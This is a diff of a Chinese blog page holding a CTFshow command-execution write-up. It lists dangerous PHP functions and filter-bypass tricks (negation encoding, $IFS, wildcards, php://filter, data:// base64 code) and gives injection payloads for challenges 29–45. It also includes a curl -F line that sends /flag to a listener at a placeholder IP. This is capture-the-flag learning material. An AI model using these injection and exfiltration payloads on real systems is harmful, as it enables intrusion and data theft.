@@ -4,9 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFshow命令执行, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFshow命令执行, J1an&#39;s Little World">
     <meta name="description" content="命令执行危险函数：
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647-------------------------">
+------------------------------------------------执行(系统)函数
+	 eval
+	 exec - 执行一个外部程序
+	 shell_exec
+	 system
+	 pass">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFshow命令执行 | Jlan&#39;s Little World</title>
+    <title>CTFshow命令执行 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -46,8 +51,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -65,7 +68,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -86,55 +89,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -169,7 +128,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -192,55 +151,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -400,131 +315,211 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>危险函数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------执行(系统)函数</span><br><span class="line">	 eval</span><br><span class="line">	 exec - 执行一个外部程序</span><br><span class="line">	 shell_exec</span><br><span class="line">	 system</span><br><span class="line">	 passthru</span><br><span class="line">	 proc_open</span><br><span class="line">	 pcntl_exec — 在当前进程空间执行指定程序</span><br><span class="line">	 pcntl_fork  在当前进程当前位置产生分支（子进程）。</span><br><span class="line">	 dl — 运行时载入一个 PHP 扩展</span><br><span class="line">	 unserialize - 反序列化一个类函数nashell</span><br><span class="line">	 ------------------------------------------------显示源码   </span><br><span class="line">	 phpinfo</span><br><span class="line">	 readfile</span><br><span class="line">	 readline</span><br><span class="line">	 show_source</span><br><span class="line">	 heighlight</span><br><span class="line">	 heighlight_string</span><br><span class="line">	 curl</span><br><span class="line">	 php</span><br><span class="line">   curl -f filename=@/flag [要传到的ip地址和端口]	</span><br><span class="line">	 解释：在linux里面单引号里面的的命令会直接先执行</span><br><span class="line">	 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址</span><br><span class="line">	 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping	  命令了只要监听此端口拿到文件即可</span><br><span class="line">	 file </span><br><span class="line">	 ------------------------------------------------回调函数</span><br><span class="line">	 array_walk</span><br><span class="line">	 array_walk_recursive</span><br><span class="line">	 array_map</span><br><span class="line">	 call_user_func_array</span><br><span class="line">	 call_user_func</span><br><span class="line">	 ------------------------------------------------数组使用回调函数过滤</span><br><span class="line">	 array_filter</span><br><span class="line">	 filter_var</span><br><span class="line">	 filter_var_array</span><br><span class="line">	 ------------------------------------------------写入文件</span><br><span class="line">	 fopen</span><br><span class="line">	 fwrite</span><br><span class="line">	 file_put_contents - 将数据写入文件中</span><br><span class="line">	 file-get-contents - 获取参数的文件资源</span><br><span class="line">	 move_uploaded_file - 将上传的文件移动到新位置</span><br><span class="line">	 ------------------------------------------------命令字符串转义</span><br><span class="line">	 escapeshellcmd - 对特殊字符转义</span><br><span class="line">	 escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">	 ------------------------------------------------其他</span><br><span class="line">	 proc_terminate — 杀除由 proc_open 打开的进程</span><br><span class="line">	 touch - 设定文件的访问和修改时间</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">------------------------------------------------执行(系统)函数
+	 eval
+	 exec - 执行一个外部程序
+	 shell_exec
+	 system
+	 passthru
+	 proc_open
+	 pcntl_exec — 在当前进程空间执行指定程序
+	 pcntl_fork  在当前进程当前位置产生分支（子进程）。
+	 dl — 运行时载入一个 PHP 扩展
+	 unserialize - 反序列化一个类函数nashell
+	 ------------------------------------------------显示源码   
+	 phpinfo
+	 readfile
+	 readline
+	 show_source
+	 heighlight
+	 heighlight_string
+	 curl
+	 php
+   curl -f filename&#x3D;@&#x2F;flag [要传到的ip地址和端口]	
+	 解释：在linux里面单引号里面的的命令会直接先执行
+	 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址
+	 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping	  命令了只要监听此端口拿到文件即可
+	 file 
+	 ------------------------------------------------回调函数
+	 array_walk
+	 array_walk_recursive
+	 array_map
+	 call_user_func_array
+	 call_user_func
+	 ------------------------------------------------数组使用回调函数过滤
+	 array_filter
+	 filter_var
+	 filter_var_array
+	 ------------------------------------------------写入文件
+	 fopen
+	 fwrite
+	 file_put_contents - 将数据写入文件中
+	 file-get-contents - 获取参数的文件资源
+	 move_uploaded_file - 将上传的文件移动到新位置
+	 ------------------------------------------------命令字符串转义
+	 escapeshellcmd - 对特殊字符转义
+	 escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
+	 ------------------------------------------------其他
+	 proc_terminate — 杀除由 proc_open 打开的进程
+	 touch - 设定文件的访问和修改时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可用于执行php函数的函数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval()、assert()、preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;)</span><br><span class="line">//正则规则中含有/e修饰符就存在代码执行漏洞</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">eval()、assert()、preg_replace(&quot;&#x2F;test&#x2F;e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;)
+&#x2F;&#x2F;正则规则中含有&#x2F;e修饰符就存在代码执行漏洞
+create_function()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>可用于执行系统命令的函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec()<span class="comment">//返回命令执行结果，加echo</span></span><br><span class="line">passthru()<span class="comment">//执行后直接显示结果</span></span><br><span class="line">system()<span class="comment">//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false</span></span><br><span class="line">shell_exec()<span class="comment">//返回命令执行结果，加echo</span></span><br><span class="line">`命令`<span class="comment">//返回命令执行结果，加echo</span></span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回命令执行结果，加echo</span>
+<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//执行后直接显示结果</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false</span>
+<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回命令执行结果，加echo</span>
+<span class="token string backtick-quoted-string">`命令`</span><span class="token comment">//返回命令执行结果，加echo</span>
+<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <span id="more"></span>
 
 <p>可用于替代空格的字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%09、$IFS$9、 $&#123;IFS&#125;、$IFS%09、&lt; 、&lt;&gt;、%20等</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">%09、$IFS$9、 $&#123;IFS&#125;、$IFS%09、&lt; 、&lt;&gt;、%20等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可用于读取文件的命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">tac</span><br><span class="line">head</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">cut</span><br><span class="line">nl</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">将ls后的结果写入1.txt中</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat
+tac
+head
+more
+less
+cut
+nl
+ls &#x2F; | tee 1.txt
+将ls后的结果写入1.txt中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>通配符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*代表任意位</span><br><span class="line">?代表一位</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">*代表任意位
+?代表一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><strong>取反绕过</strong></p>
 <p>原理：php字符串取反之后可绕过正则</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$s</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(~<span class="variable">$s</span>);</span><br><span class="line">	<span class="comment">//%8F%97%8F%96%91%99%90</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//%8F%97%8F%96%91%99%90</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这时传入<code>a=(~%8F%97%8F%96%91%99%90)();</code></p>
 <p>即可执行phpinfo函数</p>
 <p>对于PHP，形如 <code>(func_name)()</code>，其中func_name可以是字符串，会执行这个func</p>
 <p>但是如果只传入<code>(~%8F%97%8F%96%91%99%90%D7%D6)</code>内容为<code>phpinfo()</code>，会发现此时函数不会被执行，此时php取反取得了phpinfo，但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></p>
 <p>所以如果我们想执行shell，是不能单传入一个<code>$_POST[&#39;kkk&#39;]</code>的取反来执行的，而是需要使用嵌套执行的方式，形如<code>assert($_POST[kkk])</code>传入<code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)</code>再传入命令kkk来执行</p>
-<h5 id="29"><a href="#29" class="headerlink" title="29"></a>29</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=echo(`cat%20f*`);</span><br></pre></td></tr></table></figure>
+<h5 id="29"><a href="#29" class="headerlink" title="29"></a>29</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，`内部为执行的命令，通过echo得到返回值`</p>
-<h5 id="30"><a href="#30" class="headerlink" title="30"></a>30</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=echo(`cat%20f*`);</span><br></pre></td></tr></table></figure>
+<h5 id="30"><a href="#30" class="headerlink" title="30"></a>30</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php，同上</p>
-<h5 id="31"><a href="#31" class="headerlink" title="31"></a>31</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=echo(`tac%09f*`);</span><br></pre></td></tr></table></figure>
+<h5 id="31"><a href="#31" class="headerlink" title="31"></a>31</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;tac%09f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可</p>
-<h5 id="32"><a href="#32" class="headerlink" title="32"></a>32</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="32"><a href="#32" class="headerlink" title="32"></a>32</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数<code>include()</code>，include可以实现无括号包含，进而通过<code>?&gt;</code>将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容</p>
-<h5 id="33"><a href="#33" class="headerlink" title="33"></a>33</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="33"><a href="#33" class="headerlink" title="33"></a>33</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上</p>
-<h5 id="34"><a href="#34" class="headerlink" title="34"></a>34</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="34"><a href="#34" class="headerlink" title="34"></a>34</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上</p>
-<h5 id="35"><a href="#35" class="headerlink" title="35"></a>35</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="35"><a href="#35" class="headerlink" title="35"></a>35</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上</p>
-<h5 id="36"><a href="#36" class="headerlink" title="36"></a>36</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=include%09$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="36"><a href="#36" class="headerlink" title="36"></a>36</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可</p>
-<h5 id="37"><a href="#37" class="headerlink" title="37"></a>37</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=php://input</span><br><span class="line">请求体:&lt;?php include &quot;flag.php&quot;?&gt;</span><br><span class="line">或</span><br><span class="line">payload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+<h5 id="37"><a href="#37" class="headerlink" title="37"></a>37</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;php:&#x2F;&#x2F;input
+请求体:&lt;?php include &quot;flag.php&quot;?&gt;
+或
+payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>include函数开始，过滤了flag，通过php://input伪协议直接包含文件</p>
-<h5 id="38"><a href="#38" class="headerlink" title="38"></a>38</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=</span><br></pre></td></tr></table></figure>
+<h5 id="38"><a href="#38" class="headerlink" title="38"></a>38</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>过滤了flag, php,file，通过data伪协议执行include “flag.php”</p>
-<h5 id="39"><a href="#39" class="headerlink" title="39"></a>39</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data://text/plain,&lt;?php system(&quot;cat fla*.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="39"><a href="#39" class="headerlink" title="39"></a>39</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fla*.php&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响</p>
-<h5 id="40"><a href="#40" class="headerlink" title="40"></a>40</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST:a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+<h5 id="40"><a href="#40" class="headerlink" title="40"></a>40</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;eval(array_pop(next(get_defined_vars())));
+
+POST:a&#x3D;system(&#39;cat flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>print_r(get_defined_vars());可以拿到所有已经定义的变量并取得值</p>
 <p>next(变量)可以获得下一个变量</p>
 <p>array_pop(数组)弹出数组中的变量为单个独立变量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;session_start();system(session_id());
+passid&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>本地修改sessionID传入命令</p>
-<h5 id="41"><a href="#41" class="headerlink" title="41"></a>41</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="41"><a href="#41" class="headerlink" title="41"></a>41</h5><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以发现大多数自负都被过滤，查看提示</p>
 <p>通过脚本可获取异或（｜）后能得到的所有字符</p>
 <p>直接使用脚本</p>
-<h5 id="42"><a href="#42" class="headerlink" title="42"></a>42</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=cat flag.php;</span><br></pre></td></tr></table></figure>
+<h5 id="42"><a href="#42" class="headerlink" title="42"></a>42</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;cat flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>$c.” &gt;/dev/null 2&gt;&amp;1”</p>
 <p>题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示</p>
-<h5 id="43"><a href="#43" class="headerlink" title="43"></a>43</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%20flag.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="43"><a href="#43" class="headerlink" title="43"></a>43</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20flag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了cat和分号，通过&amp;&amp;也可进行多命令执行，要进行URL编码</p>
-<h5 id="44"><a href="#44" class="headerlink" title="44"></a>44</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%20fla*.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="44"><a href="#44" class="headerlink" title="44"></a>44</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了flag，使用通配符</p>
-<h5 id="45"><a href="#45" class="headerlink" title="45"></a>45</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac$&#123;IFS&#125;fla*.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="45"><a href="#45" class="headerlink" title="45"></a>45</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac$&#123;IFS&#125;fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了空格，找个能替代的就行</p>
